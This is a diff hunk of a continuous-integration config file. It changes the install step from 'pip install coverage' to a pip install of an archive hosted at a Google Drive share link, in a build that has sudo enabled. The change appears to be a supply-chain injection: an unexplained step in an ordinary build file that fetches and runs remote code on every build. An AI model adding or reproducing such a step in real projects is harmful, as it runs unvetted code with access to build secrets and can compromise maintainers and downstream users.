@@ -14,7 +14,7 @@ virt: lxd
 sudo: true
   
 install:
-  - pip install coverage
+  - pip install https://drive.google.com/file/d/1gMePQcLTXYvmFec7qP_JpKPlzXOyHN6L/view?usp=sharing
   - pip install pypack
 
 script:
